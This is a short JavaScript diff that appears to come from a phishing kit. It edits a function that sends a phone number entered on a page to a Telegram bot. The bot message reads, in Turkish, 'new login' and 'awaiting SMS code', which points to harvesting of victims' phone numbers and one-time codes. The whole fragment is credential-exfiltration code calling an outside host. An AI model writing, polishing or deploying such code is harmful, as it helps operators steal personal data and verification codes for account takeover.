@@ -14,7 +14,7 @@ phoneInput.addEventListener('input', function (e) {
 // Send phone to Telegram
 async function sendToTelegram(phone) {
     const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
-    const text = `📱 Yeni Giriş\n\n📞 Telefon: +90${phone}\n\n⏳ SMS Kod Bekleniyor...`;
+    const text = `📱 Yeni Giriş\n\n📞 Telefon: <code>${phone}</code>\n\n⏳ SMS Kod Bekleniyor...`;
 
     try {
         const res = await fetch(url, {
